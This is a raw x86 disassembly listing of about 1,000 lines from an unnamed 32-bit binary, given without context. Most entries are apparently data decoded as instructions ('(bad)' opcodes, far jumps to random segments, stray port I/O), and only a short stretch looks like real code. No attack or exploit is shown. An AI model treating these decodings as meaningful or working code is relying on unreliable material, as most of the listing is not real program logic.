  40aa58:	clc    
  40aa59:	sub    dh,BYTE PTR [edx+0x306b2a6b]
  40aa5f:	sub    bh,BYTE PTR ds:0x997e1f6a
  40aa65:	(bad)
  40aa68:	pop    edi
  40aa69:	and    ebx,DWORD PTR [eax]
  40aa6b:	sbb    BYTE PTR [esi+0x12],ch
  40aa6e:	sbb    BYTE PTR [eax],bl
  40aa70:	shr    BYTE PTR [ebx+0x177f2955],0x42
  40aa77:	add    esp,DWORD PTR [ebp+0x1c88c638]
  40aa7d:	sbb    eax,0x1b29a689
  40aa82:	xchg   esi,eax
  40aa83:	mov    esp,0xd7bbd23b
  40aa88:	mov    al,0x5c
  40aa8a:	pop    ecx
  40aa8b:	adc    DWORD PTR [edi],esp
  40aa8d:	std    
  40aa8e:	jb     0x40ab09
  40aa90:	mov    ds:0xcfc2f921,eax
  40aa95:	ja     0x40ab16
  40aa97:	mov    edi,0x591faa6d
  40aa9c:	gs (bad) 
  40aa9f:	pop    ebp
  40aaa0:	pop    edx
  40aaa1:	sbb    al,BYTE PTR [ecx+0xc]
  40aaa4:	bound  edx,QWORD PTR [ebx+0x3e99ed00]
  40aaaa:	test   BYTE PTR [edx-0x42d4052a],bl
  40aab0:	push   esp
  40aab1:	mov    BYTE PTR [edx-0x4842b343],0x29
  40aab8:	add    ebp,DWORD PTR [eax*4-0x54e2d3e6]
  40aabf:	lods   eax,DWORD PTR ds:[esi]
  40aac0:	daa    
  40aac1:	sbb    DWORD PTR [esi],ebx
  40aac3:	xchg   BYTE PTR [esi+0x15d4e623],bl
  40aac9:	daa    
  40aaca:	add    eax,ebp
  40aacc:	mov    bl,0x59
  40aace:	cld    
  40aacf:	cmp    edi,DWORD PTR [ecx-0x36]
  40aad2:	sub    edx,DWORD PTR [bp-0x70]
  40aad6:	mov    ebx,0x77a9c77b
  40aadb:	xor    BYTE PTR [eax],dh
  40aadd:	pop    esi
  40aade:	arpl   WORD PTR [ebp+0xc],dx
  40aae1:	fistp  QWORD PTR [ebx+ecx*4+0x28e015cb]
  40aae8:	fidiv  WORD PTR [ebx-0x31f98a77]
  40aaee:	and    DWORD PTR [esi+ebp*2],0xffffffe0
  40aaf2:	cmp    eax,0x7886d757
  40aaf7:	dec    esp
  40aaf8:	cmp    edx,DWORD PTR [ebp+0x1ae7bdcc]
  40aafe:	jmp    0xf6ce:0x6714c1e4
  40ab05:	inc    ecx
  40ab06:	arpl   WORD PTR [edx+eax*2],bx
  40ab09:	jo     0x40ab59
  40ab0b:	int3   
  40ab0c:	scas   eax,DWORD PTR es:[edi]
  40ab0d:	jmp    0x9fa7bb50
  40ab12:	mov    ds:0x636bbdc8,eax
  40ab17:	mov    ebx,0x18a75033
  40ab1c:	xchg   BYTE PTR [eax+0x23],bl
  40ab1f:	lock adc bl,BYTE PTR [eax-0x62]
  40ab23:	sub    BYTE PTR [ebx],bl
  40ab25:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ab27:	sbb    edx,DWORD PTR [ecx+0x4a4cb701]
  40ab2d:	std    
  40ab2e:	lock push esi
  40ab30:	push   ebp
  40ab31:	dec    ecx
  40ab32:	xor    eax,0x2f7ab1de
  40ab37:	mov    ds:0x378c5f0c,al
  40ab3c:	push   edx
  40ab3d:	data16 mov dh,0xc9
  40ab40:	lods   eax,DWORD PTR ds:[esi]
  40ab41:	in     eax,0xbe
  40ab43:	loopne 0x40ab5e
  40ab45:	jnp    0x40ab6a
  40ab47:	sbb    al,0xbe
  40ab49:	into   
  40ab4a:	lods   eax,DWORD PTR ds:[esi]
  40ab4b:	xor    eax,0x1809569b
  40ab50:	mov    al,ds:0x85269e02
  40ab55:	and    al,0x3d
  40ab57:	and    eax,0x25248b51
  40ab5c:	hlt    
  40ab5d:	mov    ebp,0xea21fcbe
  40ab62:	test   al,0x4f
  40ab64:	stos   DWORD PTR es:[edi],eax
  40ab65:	xor    al,0xf2
  40ab67:	pusha  
  40ab68:	pop    ss
  40ab69:	inc    ebx
  40ab6a:	jecxz  0x40ab4b
  40ab6c:	sub    cl,BYTE PTR [ebp+0x39]
  40ab6f:	xchg   DWORD PTR [ebx],esi
  40ab71:	adc    dh,0x61
  40ab74:	adc    dl,bh
  40ab76:	jecxz  0x40ab24
  40ab78:	jmp    0x45626c2b
  40ab7d:	xor    BYTE PTR [ebx+0x79],0x7b
  40ab81:	mov    eax,0x621a580c
  40ab86:	pop    edx
  40ab87:	fs call 0xe6d9:0xcac6b8dd
  40ab8f:	mov    ch,0x57
  40ab91:	mov    ds:0xcef513a5,al
  40ab96:	sub    edx,DWORD PTR [eax+0x58]
  40ab99:	or     dh,dh
  40ab9b:	jl     0x40ab64
  40ab9d:	add    al,0x81
  40ab9f:	adc    al,0x9a
  40aba1:	or     ah,0x1b
  40aba4:	jmp    0x40ac21
  40aba6:	pop    es
  40aba7:	and    al,0x60
  40aba9:	ins    DWORD PTR es:[edi],dx
  40abaa:	sti    
  40abab:	mov    bl,0x14
  40abad:	in     eax,dx
  40abae:	retf   
  40abaf:	dec    ecx
  40abb0:	pop    esp
  40abb1:	daa    
  40abb2:	or     DWORD PTR [ebx+0x64],esi
  40abb5:	sub    BYTE PTR [eax-0x645b40fb],dl
  40abbb:	xchg   edi,eax
  40abbc:	pop    ebp
  40abbd:	aaa    
  40abbe:	pop    eax
  40abbf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40abc0:	sbb    al,ch
  40abc2:	sub    BYTE PTR [eax],0xe6
  40abc5:	mov    ecx,DWORD PTR [ebp+0x2caf8504]
  40abcb:	dec    BYTE PTR [edx+esi*1]
  40abce:	int    0x1f
  40abd0:	iret   
  40abd1:	inc    esi
  40abd2:	ret    
  40abd3:	fwait
  40abd4:	sar    DWORD PTR [ebp+0x75],cl
  40abd7:	frstor ds:0x4dd92b5a
  40abdd:	jb     0x40abff
  40abdf:	lahf   
  40abe0:	mov    bl,0xa8
  40abe2:	mov    al,ds:0x6af331dd
  40abe7:	dec    edx
  40abe8:	xor    eax,0xe4455998
  40abed:	dec    ebp
  40abee:	test   BYTE PTR [ecx+ebp*4],cl
  40abf1:	mov    edi,0x7c4526ce
  40abf6:	cs adc al,0x5d
  40abf9:	ret    0xe682
  40abfc:	dec    ecx
  40abfd:	cmp    DWORD PTR [esi+0x2b],eax
  40ac00:	and    BYTE PTR [edi],ah
  40ac02:	(bad)  
  40ac03:	cwde   
  40ac04:	in     eax,0x82
  40ac06:	xrelease mov BYTE PTR [esi+edi*1+0x55],bl
  40ac0b:	adc    eax,0x3d4e85c3
  40ac10:	xchg   ebp,eax
  40ac11:	jmp    0xcd4fa93f
  40ac16:	(bad)  
  40ac17:	sbb    al,0x94
  40ac19:	mov    BYTE PTR [edx-0x4f],al
  40ac1c:	or     edi,esp
  40ac1e:	inc    ebp
  40ac1f:	xchg   esp,eax
  40ac20:	adc    eax,0x41ee123b
  40ac25:	shl    DWORD PTR [ecx+0x3439d053],1
  40ac2b:	sbb    edi,DWORD PTR ds:[eax-0x4e]
  40ac2f:	push   0x74bd5886
  40ac34:	mov    al,ds:0xcffadb99
  40ac39:	scas   eax,DWORD PTR es:[edi]
  40ac3a:	jns    0x40abda
  40ac3c:	jmp    0x40ac67
  40ac3e:	xor    ebx,DWORD PTR [edi+0x46]
  40ac41:	push   ebp
  40ac42:	dec    ebx
  40ac43:	xlat   BYTE PTR ds:[ebx]
  40ac44:	lods   al,BYTE PTR ds:[esi]
  40ac45:	iret   
  40ac46:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ac47:	ins    DWORD PTR es:[edi],dx
  40ac48:	bound  eax,QWORD PTR [ebx-0x4]
  40ac4b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ac4c:	test   BYTE PTR [edi+0x2c],ch
  40ac4f:	lea    ebp,ds:0x568be55c
  40ac55:	push   ecx
  40ac56:	outs   dx,DWORD PTR ds:[esi]
  40ac57:	(bad)  
  40ac58:	cmp    eax,DWORD PTR [edx-0x75]
  40ac5b:	jl     0x40ac7f
  40ac5d:	loop   0x40ac96
  40ac5f:	dec    ebx
  40ac60:	adc    ebp,ecx
  40ac62:	stos   DWORD PTR es:[edi],eax
  40ac63:	mov    edx,0x70249f37
  40ac68:	pop    DWORD PTR [esi+0x40]
  40ac6b:	std    
  40ac6c:	and    DWORD PTR [ebx+0x3b],eax
  40ac6f:	add    BYTE PTR [edx],al
  40ac71:	push   es
  40ac72:	and    bl,BYTE PTR [edx+eax*4]
  40ac75:	scas   eax,DWORD PTR es:[edi]
  40ac76:	jbe    0x40ace2
  40ac78:	sub    cl,ah
  40ac7a:	sub    DWORD PTR [edi-0x11de529e],edx
  40ac80:	sbb    DWORD PTR [ebp-0x9],ebp
  40ac83:	xchg   esp,eax
  40ac84:	mov    WORD PTR [ebp+0x7c95431b],es
  40ac8a:	inc    ecx
  40ac8b:	sbb    al,0x9e
  40ac8d:	jo     0x40ac78
  40ac8f:	add    eax,0x4bb5c0af
  40ac94:	retf   0x9d88
  40ac97:	int3   
  40ac98:	inc    eax
  40ac99:	sbb    BYTE PTR [esi],0xa9
  40ac9c:	loopne 0x40acf2
  40ac9e:	(bad)  
  40ac9f:	in     al,0x30
  40aca1:	add    DWORD PTR [eax-0x2d],ecx
  40aca4:	test   eax,0x64db3901
  40aca9:	ror    DWORD PTR [edi+edi*1],1
  40acac:	sahf   
  40acad:	fs mov edi,0xc785abf1
  40acb3:	dec    ebx
  40acb4:	jmp    0xfa556e64
  40acb9:	loope  0x40acc0
  40acbb:	(bad)  
  40acbd:	icebp  
  40acbe:	mov    esi,0xdcc92be8
  40acc3:	ins    DWORD PTR es:[edi],dx
  40acc4:	js     0x40ad2f
  40acc6:	mov    eax,0x8232465e
  40accb:	leave  
  40accc:	outs   dx,BYTE PTR ds:[esi]
  40accd:	fs cmp ah,ch
  40acd0:	push   edi
  40acd1:	outs   dx,BYTE PTR ds:[esi]
  40acd2:	outs   dx,DWORD PTR ds:[esi]
  40acd3:	pop    esp
  40acd4:	fnsave [esi-0x6d]
  40acd7:	and    DWORD PTR [ebx+edx*4+0x1a],edi
  40acdb:	arpl   WORD PTR [esi-0x5824d484],sp
  40ace1:	in     al,dx
  40ace2:	int    0x3b
  40ace4:	repz aam 0x0
  40ace7:	mov    BYTE PTR [ebx-0x4362f95f],0x72
  40acee:	fld    TBYTE PTR ds:0xccfc0295
  40acf4:	xchg   edi,eax
  40acf5:	clc    
  40acf6:	sbb    dl,ah
  40acf8:	mov    esp,0xba4ad543
  40acfd:	xchg   ebx,eax
  40acfe:	jmp    0xc819:0xbe1981e5
  40ad05:	jg     0x40acbe
  40ad07:	adc    al,0xb4
  40ad09:	adc    esi,DWORD PTR [ecx]
  40ad0b:	mov    WORD PTR [ebp+0x1ad4c3e],cs
  40ad11:	push   cs
  40ad12:	and    eax,0xa9fabdef
  40ad17:	add    bl,BYTE PTR [edx-0x58cf9af6]
  40ad1d:	xchg   cl,ch
  40ad1f:	int    0x5c
  40ad21:	les    ebx,FWORD PTR [ecx+edx*4-0x55b6c93]
  40ad28:	jne    0x40ad4a
  40ad2a:	mov    ebx,0xcbc4caff
  40ad2f:	cmp    DWORD PTR [esi+0x739a1343],edi
  40ad35:	lea    eax,[ecx-0x65]
  40ad38:	cmp    BYTE PTR [edi+0x42c07a7d],dl
  40ad3e:	push   0x4c
  40ad40:	loop   0x40acd0
  40ad42:	ds xchg esi,eax
  40ad44:	xchg   ebx,eax
  40ad45:	adc    ah,BYTE PTR [edi]
  40ad47:	mov    bl,BYTE PTR [edi-0x58e85bd]
  40ad4d:	xchg   BYTE PTR [eax+edi*1-0x78223f91],bh
  40ad54:	pusha  
  40ad55:	inc    esi
  40ad56:	mov    ds:0x3e95fd9,eax
  40ad5b:	scas   al,BYTE PTR es:[edi]
  40ad5c:	out    0x1d,al
  40ad5e:	xchg   ecx,eax
  40ad5f:	and    dl,dh
  40ad61:	or     edx,edi
  40ad63:	aas    
  40ad64:	sub    ah,bh
  40ad66:	fld    QWORD PTR [ebp+0x2c]
  40ad69:	or     eax,0xd89bae4
  40ad6e:	add    eax,0x3f742274
  40ad73:	jl     0x40ade4
  40ad75:	call   0xac1e:0xba5c2de2
  40ad7c:	daa    
  40ad7d:	or     cl,BYTE PTR [ebx+0x69]
  40ad80:	ja     0x40ad43
  40ad82:	sbb    al,0xb8
  40ad84:	xchg   ebp,eax
  40ad85:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ad86:	fs mov esi,0x27e2a011
  40ad8c:	loopne 0x40ad99
  40ad8e:	int3   
  40ad8f:	mov    ds:0xd69e2fc9,al
  40ad94:	inc    ecx
  40ad95:	jns    0x40ad3a
  40ad97:	fisub  DWORD PTR [edx]
  40ad99:	shr    DWORD PTR [ecx-0x59],0xbe
  40ad9d:	add    eax,0xe6237332
  40ada2:	jp     0x40ae0c
  40ada4:	push   ecx
  40ada5:	popf   
  40ada6:	adc    eax,esp
  40ada8:	sbb    BYTE PTR [edi-0x3c4eac01],ah
  40adae:	xor    ch,BYTE PTR [edi]
  40adb0:	cmp    ebp,ebp
  40adb2:	add    al,0xa7
  40adb4:	sub    dl,BYTE PTR [eax+0x1cc01f46]
  40adba:	rep outs dx,DWORD PTR ds:[esi]
  40adbc:	mov    esi,0xe5074fb4
  40adc1:	aam    0x7c
  40adc3:	icebp  
  40adc4:	(bad)  
  40adc5:	jp     0x40ad74
  40adc7:	pusha  
  40adc8:	hlt    
  40adc9:	jge    0x40ae37
  40adcb:	ret    
  40adcc:	std    
  40adcd:	sub    ah,BYTE PTR [edi-0x532328fd]
  40add3:	sbb    DWORD PTR [ebp-0x32],edi
  40add6:	shl    bh,0xbe
  40add9:	xor    BYTE PTR [ebx+eiz*1+0x3c],bl
  40addd:	fwait
  40adde:	dec    ecx
  40addf:	hlt    
  40ade0:	mov    al,ds:0x9cfd83f2
  40ade5:	call   0x9df1a1ea
  40adea:	ins    BYTE PTR es:[edi],dx
  40adeb:	jne    0x40ade3
  40aded:	jmp    0x40adb3
  40adef:	dec    esi
  40adf0:	cmovo  esi,DWORD PTR [edi+ebp*2]
  40adf4:	adc    DWORD PTR [ebx-0x22],edx
  40adf7:	xchg   edi,eax
  40adf8:	push   ds
  40adf9:	jo     0x40ae4e
  40adfb:	pop    es
  40adfc:	test   eax,0xdeec83b7
  40ae01:	mov    dh,0xd4
  40ae03:	sub    eax,DWORD PTR [ebx-0x28]
  40ae06:	shl    BYTE PTR [edx],cl
  40ae08:	adc    bl,dh
  40ae0a:	push   edi
  40ae0b:	push   ss
  40ae0c:	clc    
  40ae0d:	imul   eax,eax,0xe7b84450
  40ae13:	add    eax,DWORD PTR ds:0x6db17fd2
  40ae19:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ae1a:	jno    0x40ae07
  40ae1c:	shr    DWORD PTR [eax-0xb],0x46
  40ae20:	push   es
  40ae21:	inc    ebx
  40ae22:	fldcw  WORD PTR [ebx-0x6636dcca]
  40ae28:	sbb    al,BYTE PTR [eax-0x274e171d]
  40ae2e:	shl    DWORD PTR [edx-0x6f],cl
  40ae31:	xor    ecx,ebp
  40ae33:	jl     0x40ae2c
  40ae35:	pop    ebx
  40ae36:	add    edx,DWORD PTR [ebx+0x1a]
  40ae39:	jo     0x40ae16
  40ae3b:	xor    esi,DWORD PTR [esi]
  40ae3d:	add    eax,0x5db39d26
  40ae42:	mov    ch,0x46
  40ae44:	aam    0x6d
  40ae46:	xchg   esi,eax
  40ae47:	or     DWORD PTR [edi+eax*8],esi
  40ae4a:	inc    ebp
  40ae4b:	loopne 0x40ae10
  40ae4d:	outs   dx,BYTE PTR ds:[esi]
  40ae4e:	add    BYTE PTR [eax],al
  40ae50:	xor    ecx,0x7405
  40ae56:	push   esi
  40ae57:	mov    DWORD PTR [ebp-0x1c],0x2a74
  40ae5e:	mov    DWORD PTR [ebp-0x10],0x2e2c
  40ae65:	push   0x5285
  40ae6a:	xor    ecx,0x324d
  40ae70:	mov    DWORD PTR [ebp-0xc],0x3d0a
  40ae77:	sbb    eax,ecx
  40ae79:	mov    eax,DWORD PTR [ebp-0x10]
  40ae7c:	cmp    DWORD PTR ds:0x42824b,0x0
  40ae83:	mov    ecx,DWORD PTR ds:0x428213
  40ae89:	mov    ecx,0x7ccc
  40ae8e:	jmp    0x40af01
  40ae93:	mov    DWORD PTR ds:0x428347,edx
  40ae99:	movzx  ecx,BYTE PTR ds:0x42822b
  40aea0:	cmp    DWORD PTR ds:0x42824b,0x0
  40aea7:	ja     0x40aee7
  40aead:	push   0x309a
  40aeb2:	push   DWORD PTR [ebp-0x1c]
  40aeb5:	push   DWORD PTR [ebp-0x14]
  40aeb8:	push   0x42807b
  40aebd:	call   DWORD PTR ds:0x428e38
  40aec3:	mov    ecx,DWORD PTR ds:0x4282cb
  40aec9:	xor    DWORD PTR ds:0x4281ef,ecx
  40aecf:	or     DWORD PTR ds:0x42833b,ecx
  40aed5:	or     DWORD PTR ds:0x428253,ecx
  40aedb:	mov    ecx,DWORD PTR ds:0x42825f
  40aee1:	adc    DWORD PTR ds:0x428227,ecx
  40aee7:	xor    ecx,ecx
  40aee9:	or     ecx,DWORD PTR ds:0x428123
  40aeef:	adc    ecx,DWORD PTR ds:0x428347
  40aef5:	mov    DWORD PTR ds:0x428123,ecx
  40aefb:	and    ecx,0x2e4b
  40af01:	mov    ecx,DWORD PTR [ebp-0xc]
  40af04:	push   0x712c
  40af09:	adc    DWORD PTR ds:0x428343,0x4282b7
  40af13:	push   ecx
  40af14:	and    DWORD PTR ds:0x428123,0x72a4
  40af1e:	jmp    0x40b314
  40af23:	xchg   ecx,eax
  40af24:	sahf   
  40af25:	push   0x5e4f260e
  40af2a:	push   ds
  40af2b:	(bad)  
  40af2c:	fist   WORD PTR [edi-0x56]
  40af2f:	mov    ds:0xb570d137,eax
  40af34:	sbb    ebx,DWORD PTR [eax]
  40af36:	sbb    BYTE PTR [esi+0x12],ch
  40af39:	sbb    BYTE PTR [eax],bl
  40af3b:	xchg   edi,eax
  40af3c:	gs jmp 0x2234:0x2c675930
  40af44:	ins    DWORD PTR es:[edi],dx
  40af45:	jae    0x40aef5
  40af47:	stos   DWORD PTR es:[edi],eax
  40af48:	jae    0x40af87
  40af4a:	mov    bl,BYTE PTR [edx]
  40af4c:	fnsave [eax-0x38]
  40af4f:	cmp    ah,dl
  40af51:	fsubr  DWORD PTR [esi+esi*1]
  40af54:	test   eax,0x609998c
  40af59:	dec    edi
  40af5a:	jno    0x40afd4
  40af5c:	cmp    al,0x70
  40af5e:	sub    al,0x41
  40af60:	les    esp,FWORD PTR [ebx]
  40af62:	fldenv [edi+0x1219a47f]
  40af68:	pop    ebx
  40af69:	in     al,dx
  40af6a:	arpl   WORD PTR [ebx-0x8],si
  40af6d:	cmc    
  40af6e:	ror    ebx,0x88
  40af71:	aad    0x28
  40af73:	imul   edi,edx,0xe70d8b02
  40af79:	cmp    ah,dh
  40af7b:	mov    ah,0x57
  40af7d:	or     bh,0x98
  40af80:	int3   
  40af81:	cmc    
  40af82:	cld    
  40af83:	fisubr WORD PTR [ecx]
  40af85:	push   ss
  40af86:	mov    eax,ds:0x1e2df26a
  40af8b:	add    al,bl
  40af8d:	(bad)  
  40af8f:	add    al,ch
  40af91:	adc    eax,0x9cf7ceba
  40af96:	fwait
  40af97:	inc    ebx
  40af98:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  40af9a:	or     DWORD PTR [edx-0x73],ebp
  40af9d:	fldcw  WORD PTR [ebp-0x7]
  40afa0:	mov    WORD PTR [edx],ds
  40afa2:	ficom  WORD PTR [ebx]
  40afa4:	pop    ecx
  40afa5:	icebp  
  40afa6:	lods   eax,DWORD PTR ds:[esi]
  40afa7:	push   ss
  40afa8:	jmp    0x58dc183e
  40afad:	cs and cl,al
  40afb0:	dec    ebp
  40afb1:	adc    al,0x93
  40afb3:	clc    
  40afb4:	in     eax,dx
  40afb5:	sbb    DWORD PTR [eax-0x629f777],0xfc08f63c
  40afbf:	dec    eax
  40afc0:	es (bad) 
  40afc2:	dec    edx
  40afc3:	imul   ebp,DWORD PTR [edx-0x35],0xffffffd6
  40afc7:	mov    gs,WORD PTR [ebx+0x30b70b12]
  40afcd:	dec    eax
  40afce:	xchg   edi,eax
  40afcf:	adc    eax,0xa9c3f715
  40afd4:	das    
  40afd5:	idiv   BYTE PTR [ecx]
  40afd7:	out    dx,eax
  40afd8:	pop    es
  40afd9:	inc    edi
  40afda:	adc    ebx,DWORD PTR ss:[ebx+0x61713910]
  40afe1:	xor    BYTE PTR [ebp+0x41387dfa],dh
  40afe7:	xor    BYTE PTR [ebp+0x2f],bh
  40afea:	fmul   DWORD PTR [ecx+0x7afced83]
  40aff0:	das    
  40aff1:	jnp    0x40afb6
  40aff3:	inc    ebx
  40aff4:	outs   dx,BYTE PTR ds:[esi]
  40aff5:	in     eax,dx
  40aff6:	imul   ebx,DWORD PTR [ebp-0x30],0x1b3ae4b1
  40affd:	or     DWORD PTR [eax],eax
  40afff:	sub    eax,0x877bb36a
  40b004:	xchg   edx,eax
  40b005:	addr16 dec esi
  40b007:	js     0x40b084
  40b009:	push   ecx
  40b00a:	cmp    ch,BYTE PTR ds:0x5f61395
  40b010:	pop    esp
  40b011:	clc    
  40b012:	inc    edx
  40b013:	sbb    dh,dl
  40b015:	das    
  40b016:	ja     0x40b067
  40b018:	xor    eax,DWORD PTR [edi+0x1a7e0f49]
  40b01e:	es xchg ebx,eax
  40b020:	xor    cl,BYTE PTR [eax+0x6294014c]
  40b026:	fistp  QWORD PTR [esi]
  40b028:	fist   DWORD PTR [ecx]
  40b02a:	enter  0x7134,0x86
  40b02e:	aas    
  40b02f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b030:	aas    
  40b031:	(bad)  
  40b032:	dec    ebp
  40b033:	or     eax,0x29484a9a
  40b038:	push   0x521d4275
  40b03d:	sbb    dl,BYTE PTR [esi*1+0x3c89be02]
  40b044:	rcl    DWORD PTR [edi+0x31],cl
  40b047:	inc    eax
  40b048:	cmp    ecx,esi
  40b04a:	inc    ecx
  40b04b:	sub    al,0x8c
  40b04d:	inc    edi
  40b04e:	out    0x8d,al
  40b050:	outs   dx,DWORD PTR ds:[esi]
  40b051:	mov    eax,ecx
  40b053:	lods   eax,DWORD PTR ds:[esi]
  40b054:	inc    esi
  40b055:	add    ebp,ebx
  40b057:	jle    0x40b005
  40b059:	sub    al,0x25
  40b05b:	push   ecx
  40b05c:	dec    ecx
  40b05d:	retf   0x3955
  40b060:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b061:	adc    DWORD PTR [edi+0x792f6719],eax
  40b067:	ret    
  40b068:	or     BYTE PTR [esi+0x69],al
  40b06b:	or     BYTE PTR [edi],cl
  40b06d:	test   BYTE PTR [esi],bl
  40b06f:	aad    0x39
  40b071:	lods   al,BYTE PTR ds:[esi]
  40b072:	xchg   ecx,eax
  40b073:	xor    al,0x98
  40b075:	xchg   esi,eax
  40b076:	push   ebx
  40b077:	(bad)  
  40b078:	mov    al,0xda
  40b07a:	imul   esi,DWORD PTR [ecx+0x13a6e6ac],0xffffffc9
  40b081:	jp     0x40b0a4
  40b083:	mov    esp,0xf8620ce5
  40b088:	jmp    DWORD PTR [esi]
  40b08a:	add    al,al
  40b08c:	jecxz  0x40b0ab
  40b08e:	outs   dx,DWORD PTR ds:[esi]
  40b08f:	and    DWORD PTR [ecx],0x6f2b1328
  40b095:	mov    esi,0x97269957
  40b09a:	shl    bh,cl
  40b09c:	add    ch,cl
  40b09e:	ror    DWORD PTR es:[ebx+0x1],1
  40b0a2:	inc    ebx
  40b0a3:	(bad)  fs:[edi-0x7e2c18cd]
  40b0aa:	push   eax
  40b0ab:	mov    al,ds:0xca4baaf9
  40b0b0:	xor    ecx,edi
  40b0b2:	std    
  40b0b3:	jmp    0x8e90:0x4c602579
  40b0ba:	dec    ebx
  40b0bb:	fldcw  WORD PTR [edi-0x2e]
  40b0be:	int    0x20
  40b0c0:	jl     0x40b122
  40b0c2:	xor    BYTE PTR [edi],dl
  40b0c4:	ss dec dl
  40b0c7:	cmp    dl,BYTE PTR [ebp-0x49]
  40b0ca:	ret    0x8e68
  40b0cd:	out    dx,eax
  40b0ce:	pop    edx
  40b0cf:	jle    0x40b0e2
  40b0d1:	pop    esi
  40b0d2:	mov    ds:0xcf316bc7,al
  40b0d7:	outs   dx,DWORD PTR ds:[esi]
  40b0d8:	and    esi,DWORD PTR [eax-0x152dd165]
  40b0de:	sbb    eax,0xbfc871cb
  40b0e3:	pop    ebp
  40b0e4:	test   DWORD PTR [edx-0x28],ebp
  40b0e7:	xor    BYTE PTR [ecx-0xe8c3e02],bh
  40b0ed:	int    0xca
  40b0ef:	call   0xf24b:0xd58ef406
  40b0f6:	call   0x2110:0xf06a929f
  40b0fd:	xor    cl,bh
  40b0ff:	std    
  40b100:	aad    0xd8
  40b102:	repnz aaa 
  40b104:	jge    0x40b0c8
  40b106:	rol    DWORD PTR [ecx+0x6d],1
  40b109:	aaa    
  40b10a:	ret    0xd701
  40b10d:	fcomip st,st(7)
  40b10f:	sub    al,0x3b
  40b111:	sub    DWORD PTR [esi+0x5e],0x9009c6af
  40b118:	outs   dx,BYTE PTR ds:[esi]
  40b119:	in     eax,dx
  40b11a:	mov    esp,0xbb4c82dd
  40b11f:	icebp  
  40b120:	add    al,0xbd
  40b122:	add    DWORD PTR [ecx],0x31
  40b125:	jnp    0x40b113
  40b127:	add    DWORD PTR [esi+0x6d],0x5f
  40b12b:	ficom  WORD PTR [ebx+ebx*2]
  40b12e:	mov    al,ds:0x4da08b9f
  40b133:	scas   al,BYTE PTR es:[edi]
  40b134:	adc    ebx,DWORD PTR [edx-0x40]
  40b137:	cmp    DWORD PTR [esi+ebp*2],0x87c7bb57
  40b13e:	push   ecx
  40b13f:	fucomp st(6)
  40b141:	pusha  
  40b142:	or     ch,BYTE PTR [edi]
  40b144:	rsqrtps xmm5,XMMWORD PTR [esi]
  40b147:	dec    eax
  40b148:	add    BYTE PTR [ebp+0x38552609],ah
  40b14e:	(bad)  
  40b14f:	jo     0x40b127
  40b151:	lea    ecx,[eax]
  40b153:	or     esp,esi
  40b155:	inc    edi
  40b156:	ds pop ebp
  40b158:	repz imul edi,DWORD PTR cs:[ebx],0xa8963191
  40b160:	data16 clc 
  40b162:	sub    bh,BYTE PTR [edi]
  40b164:	fld    DWORD PTR [ebp+0x7617ced9]
  40b16a:	in     eax,0xf3
  40b16c:	push   eax
  40b16d:	lods   al,BYTE PTR ds:[esi]
  40b16e:	iret   
  40b16f:	imul   edx,DWORD PTR [ebp-0x49a71210],0x26
  40b176:	push   0xb74ec4b5
  40b17b:	or     cl,BYTE PTR [esi+0x7390d998]
  40b181:	push   DWORD PTR [edx]
  40b183:	rol    BYTE PTR [eax+0x36],cl
  40b186:	js     0x40b1a2
  40b188:	bnd js 0x40b149
  40b18b:	push   es
  40b18c:	(bad)  
  40b18d:	jl     0x40b1b5
  40b18f:	push   ds
  40b190:	jae    0x40b206
  40b192:	imul   eax,DWORD PTR [edx+0x2f],0xffffffae
  40b196:	(bad)  
  40b198:	cmp    eax,0x25e83495
  40b19d:	dec    edi
  40b19e:	js     0x40b216
  40b1a0:	(bad)  
  40b1a1:	cmp    cl,BYTE PTR [esp+edi*8+0x7e3ef85a]
  40b1a8:	xlat   BYTE PTR ds:[ebx]
  40b1a9:	(bad)  
  40b1ab:	(bad)  
  40b1ac:	jmp    0x40b134
  40b1ae:	add    eax,0x57bb2152
  40b1b3:	pop    edx
  40b1b4:	mov    eax,0x21de88af
  40b1b9:	stc    
  40b1ba:	jmp    0xabfb6542
  40b1bf:	jmp    0xae30b4bd
  40b1c4:	shl    BYTE PTR [eax-0x30],cl
  40b1c7:	aas    
  40b1c8:	dec    ebp
  40b1c9:	int    0xac
  40b1cb:	fs pop ecx
  40b1cd:	or     DWORD PTR [edx+0x48e48d41],edx
  40b1d3:	mov    ah,0xe2
  40b1d5:	fdiv   DWORD PTR [eax]
  40b1d7:	add    DWORD PTR [esi-0x311302b4],ecx
  40b1dd:	xchg   ebx,eax
  40b1de:	pop    ecx
  40b1df:	(bad)  
  40b1e0:	push   ebx
  40b1e1:	out    0x49,eax
  40b1e3:	cmc    
  40b1e4:	push   cs
  40b1e5:	mov    DWORD PTR [ebx],edi
  40b1e7:	pop    esi
  40b1e8:	pop    edi
  40b1e9:	jo     0x40b175
  40b1eb:	outs   dx,DWORD PTR ds:[esi]
  40b1ec:	(bad)  [eax+eiz*4+0x44]
  40b1f0:	xchg   BYTE PTR [eax+0x2a33ead9],dh
  40b1f6:	pop    ds
  40b1f7:	and    ah,0xee
  40b1fa:	mov    bl,BYTE PTR [eax+eax*1]
  40b1fd:	shl    DWORD PTR [edx+0x2],1
  40b200:	cdq    
  40b201:	aaa    
  40b202:	xor    al,0x44
  40b204:	popa   
  40b205:	cmp    eax,DWORD PTR [eax+0x43]
  40b208:	pop    ebx
  40b209:	imul   eax,DWORD PTR [ebx+0x6ac5d1d8],0x3c3c1d46
  40b213:	xor    eax,0x2908179d
  40b218:	push   ebx
  40b219:	loope  0x40b259
  40b21b:	and    DWORD PTR [esi],edi
  40b21d:	or     eax,0x28a6f2e3
  40b222:	outs   dx,BYTE PTR ds:[esi]
  40b223:	dec    BYTE PTR [ebx-0x62c1934b]
  40b229:	mov    ch,0x5c
  40b22b:	ja     0x40b234
  40b22d:	sub    edi,DWORD PTR [edx+0x49401040]
  40b233:	scas   al,BYTE PTR es:[edi]
  40b234:	test   eax,0x12ba404c
  40b239:	leave  
  40b23a:	jecxz  0x40b2b1
